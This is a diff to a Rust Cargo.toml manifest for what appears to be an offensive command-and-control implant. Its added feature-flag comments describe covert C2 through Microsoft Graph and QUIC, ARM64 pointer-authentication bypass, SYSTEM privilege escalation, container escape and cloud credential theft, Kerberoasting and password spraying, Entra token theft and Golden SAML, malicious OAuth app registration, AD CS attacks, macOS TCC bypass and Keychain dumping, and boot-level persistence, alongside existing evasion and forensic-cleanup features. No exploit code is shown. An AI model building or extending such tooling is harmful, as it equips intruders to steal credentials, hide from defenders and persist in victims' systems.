@@ -30,6 +30,7 @@ dirs = "5.0"
 lazy_static = "1.4"
 uuid = { version = "1.0", features = ["v4"] }
 base64 = { workspace = true }
+urlencoding = { workspace = true }
 serde_json = "1.0"
 serde = { workspace = true }
 module_loader = { path = "../module_loader" }
@@ -85,12 +86,13 @@ async-trait = "0.1.89"
 winapi = { version = "0.3", features = ["ntdef", "psapi", "threadpoolapiset", "threadpoollegacyapiset", "memoryapi", "winnt", "ntsecapi", "sspi"] }
 russh = { version = "0.46", optional = true }
 russh-keys = { version = "0.46", optional = true }
+quinn = { version = "0.11", optional = true }
 notify = { version = "6.1", optional = true }
 
 [target.'cfg(target_os = "linux")'.dependencies]
-x11cap = { version = "0.1", optional = true }
 enigo = { version = "0.2", optional = true, default-features = false, features = ["x11rb"] }
 image = { version = "0.25", optional = true }
+x11rb = { version = "0.13", optional = true, features = ["image"] }
 zbus = { version = "4", optional = true, default-features = false, features = ["tokio"] }
 futures-util = { version = "0.3", optional = true, default-features = false }
 
@@ -115,11 +117,11 @@ hot-reload = ["notify"]
 env-validation = []
 persistence = []
 network-discovery = []
-# `dep:x11cap` only resolves when compiling for Linux (see
-# `[target.'cfg(target_os = "linux")'.dependencies]`); on Windows it is a
-# no-op feature activation because the optional dep is absent from the
-# target-specific dependency table.
-remote-assist = ["dep:enigo", "dep:image", "dep:x11cap", "dep:zbus", "dep:futures-util"]
+# Linux screenshot support uses x11rb for X11, xdg-desktop-portal over D-Bus for
+# Wayland, and /dev/fb0 as a headless fallback.  x11rb is pure Rust, so the
+# remote-assist feature cross-compiles for Linux ARM64 without target pkg-config
+# or an X11 sysroot.
+remote-assist = ["dep:enigo", "dep:image", "dep:x11rb", "dep:zbus", "dep:futures-util"]
 module-signatures = ["common/module-signatures"]
 direct-syscalls = []
 # Pre-injection ETW auto-logger enumeration via registry (NtOpenKey /
@@ -195,6 +197,21 @@ ssh-transport = ["dep:russh", "dep:russh-keys"]
 # The server-side SMB relay is provided by orchestra-server
 # (see smb_relay module).
 smb-pipe-transport = []
+# Activate the Microsoft Graph API covert C2 transport
+# (c2_graph::GraphTransport).  Tunnels C2 traffic through Microsoft Graph
+# API endpoints (Outlook drafts, OneDrive files, Teams messages, or
+# SharePoint lists).  Traffic to graph.microsoft.com is indistinguishable
+# from legitimate Office 365 / M365 traffic, making it essentially
+# impossible to block in enterprise environments.  Uses reqwest, serde,
+# base64, rand, and tokio — all already in the dependency tree.
+graph-transport = []
+# Activate the QUIC (HTTP/3) covert C2 transport (c2_quic::QuicTransport).
+# Tunnels C2 traffic over QUIC streams with TLS 1.3. Provides UDP-based
+# transport with head-of-line blocking elimination, connection migration,
+# and NAT traversal.  HTTP/3 compatibility mode available for traffic
+# blending.  Uses quinn (pure-Rust QUIC), rustls, and tokio — minimal
+# additional binary size impact since rustls is already in the dep tree.
+quic-transport = ["dep:quinn"]
 # Use hardware-breakpoint (DR0/DR1 + VEH) AMSI/ETW bypass instead of the
 # default memory-patch approach.  The HWBP strategy is stealthier (no .text
 # modification) but is only needed when memory-patching is blocked by CFG or
@@ -318,6 +335,19 @@ seh-anti-debug = []
 # Windows-only.
 cet-bypass = ["direct-syscalls"]
 
+# ARM64 BTI (Branch Target Identification) and PAC (Pointer Authentication
+# Code) bypass: ARM64 equivalents of the Intel CET bypass.  PAC signs
+# return addresses and function pointers with cryptographic keys stored in
+# system registers — it is significantly harder to bypass than CET (which
+# only maintains a shadow stack).  Strategies: (1) PAC-valid trampoline
+# routing through system DLLs, (2) PAC key extraction via BYOVD (requires
+# kernel-callback feature + a loaded vulnerable driver), (3) PAC strip and
+# re-sign.  BTI bypass uses gadget scanning for BTI-validated indirect
+# branch targets (BTI instruction encodings).  Integrates with clean_call!
+# for ARM64 Windows.  Requires (and implies) `direct-syscalls`.
+# Windows ARM64 only.
+pac-bypass = ["direct-syscalls"]
+
 # Token-only impersonation via NtImpersonateThread / SetThreadToken:
 # bypasses ImpersonateNamedPipeClient detection by extracting the
 # impersonation token through a helper thread and applying it to the
@@ -328,6 +358,22 @@ cet-bypass = ["direct-syscalls"]
 # Requires (and implies) `direct-syscalls`.  Windows-only.
 token-impersonation = ["direct-syscalls"]
 
+# Local Privilege Escalation: automated SYSTEM token acquisition via token
+# theft, named pipe impersonation, and Print Spooler exploitation.
+# Tries multiple techniques in order, returns first success.
+# Windows-only.  Gated by `lpe` feature flag (implies `direct-syscalls`).
+lpe = ["direct-syscalls"]
+
+# Container escape, cloud metadata credential theft, and cloud IAM lateral
+# movement.  Detects Docker/Podman/Kubernetes/LXC environments, attempts
+# cgroup release_notification, device mount, and mount propagation escapes.
+# Queries AWS IMDS (v1+v2), Azure IMDS, GCP IMDS for temporary credentials.
+# Uses stolen credentials to enumerate AWS (S3, EC2, IAM) and Azure
+# (subscriptions, Key Vaults, Storage, VMs) resources via SigV4 and ARM REST.
+# Also reads K8s service account tokens and enumerates pods.
+# Linux-only.  Gated by `container-escape` feature flag (implies `direct-syscalls`).
+container-escape = ["direct-syscalls"]
+
 # Forensic cleanup — Windows Prefetch evidence removal: cleans .pf files
 # after injection or on-demand to prevent forensic timeline analysis.
 # Three methods: (1) delete via NtDeleteFile, (2) patch header in-place
@@ -337,6 +383,13 @@ token-impersonation = ["direct-syscalls"]
 # Hooks into injection_engine post-injection for automatic cleanup.
 # Requires (and implies) `direct-syscalls`.  Windows-only.
 forensic-cleanup = ["direct-syscalls"]
+# Automated internal reconnaissance and target profiling: Active Directory
+# enumeration (LDAP), automated attack path discovery (graph-based BFS),
+# cloud environment fingerprinting (registry + IMDS), and credential
+# attack automation (Kerberoasting, AS-REP Roasting, password spraying).
+# All API resolution via pe_resolve (wldap32, netapi32, advapi32, secur32).
+# Windows-only.
+recon = []
 # Kerberos relay attack via COM cross-session activation: captures Kerberos
 # service tickets without NTLM by triggering COM activation (CoCreateInstanceEx
 # with custom COSERVERINFO) against an attacker-controlled RPC listener.
@@ -437,6 +490,16 @@ wmi-persistence = []
 # uses /sys/firmware/efi/efivars, Windows uses GetFirmwareEnvironmentVariableW).
 # Gated by `uefi-persistence` feature flag.
 uefi-persistence = ["dep:uefi-persistence"]
+# Hardware-level persistence and attack capabilities: Thunderbolt/DMA
+# attack infrastructure (controller detection, vulnerability assessment,
+# DMA payload generation, physical memory read), boot-sector/VBR
+# persistence (BIOS and UEFI), and boot-level artifact detection/removal.
+# Cross-platform (Linux reads /sys/bus/thunderbolt and /sys/firmware/efi;
+# Windows uses SetupAPI, registry, and raw disk I/O).  All disk writes are
+# backed up and verified by read-back.  Physical-access techniques are
+# documented as requiring operator presence at the target.
+# Gated by `hardware-persistence` feature flag.
+hardware-persistence = []
 # eBPF-based Linux evasion: hides the agent's process, files, and network
 # connections from user-space monitoring tools by loading eBPF programs that
 # intercept getdents64, openat, and read syscalls. Requires root or
@@ -520,6 +583,47 @@ coop = []
 # Cross-platform (Entra ID is cloud-based — no Windows-only APIs needed).
 # Gated by `entra-ptc` feature flag (implies `ring` for RSA signing).
 entra-ptc = ["dep:ring"]
+
+# Entra ID credential attacks: PRT theft (browser cookies, DPAPI, WAM,
+# CloudAP extraction), Pass-the-Certificate (reuse of entra_ptc patterns),
+# Golden SAML (AD FS token-signing key extraction and SAML 2.0 assertion
+# forging), and token utilization helpers (Graph API, ARM, Key Vault).
+# PRT bypasses MFA — no Domain Admin or LSASS access needed.  Tokens held
+# in memory only.  Implies `ring` (RSA signing, SHA-256 digest) and
+# `entra-ptc` (shared types: CloudEnvironment, CertSource, TokenResponse).
+entra-attacks = ["dep:ring", "entra-ptc"]
+
+# Entra ID OAuth application abuse: register malicious applications in a
+# compromised Azure AD tenant, grant them high-privilege API permissions
+# (Mail.Read, Files.Read.All, Directory.Read.All, RoleManagement), and
+# authenticate via client-credentials flow for persistent password-free
+# access.  App secrets are encrypted via HKDF from the session key — never
+# stored in plaintext.  Includes tenant enumeration, mailbox/file access,
+# and Global Admin elevation.  Cross-platform (cloud API).  Implies
+# `entra-ptc` for shared Graph API types (CloudEnvironment, TokenResponse,
+# GraphUser, GraphGroup, etc.).  No additional crate dependencies beyond
+# reqwest, serde, hkdf, and sha2 (all already in the dependency tree).
+entra-app-abuse = ["entra-ptc"]
+
+# Active Directory Certificate Services (AD CS) attack capabilities:
+# ESC1-ESC8 template/CA enumeration via LDAP (wldap32.dll, no IAT entries),
+# static vulnerability detection, certificate requests via certreq.exe
+# (temp CSR files cleaned up immediately — certificates held in memory only),
+# and PKINIT Kerberos authentication with the obtained certificate.
+# Certificate-based attacks survive password resets.  Requires a domain-
+# joined Windows environment.  Windows-only via `#[cfg(windows)]` in the
+# module.  No new crate dependencies beyond what is already in the tree.
+adcs-attacks = []
+
+# macOS post-exploitation: TCC bypass (database manipulation, synthetic click,
+# vulnerable process delegation), SIP status assessment and capability
+# enumeration, XPC service discovery and privilege escalation abuse,
+# Keychain dump and Secure Enclave key enumeration.  Uses raw FFI to
+# Apple frameworks (CoreFoundation, CoreGraphics, Security, Foundation)
+# via inline #[link] attributes — no external crate dependencies.
+# macOS-only (aarch64-apple-darwin and x86_64-apple-darwin).
+# Gated by `macos-postexp` feature flag.
+macos-postexp = []
 
 [[bin]]
 name = "agent-standalone"
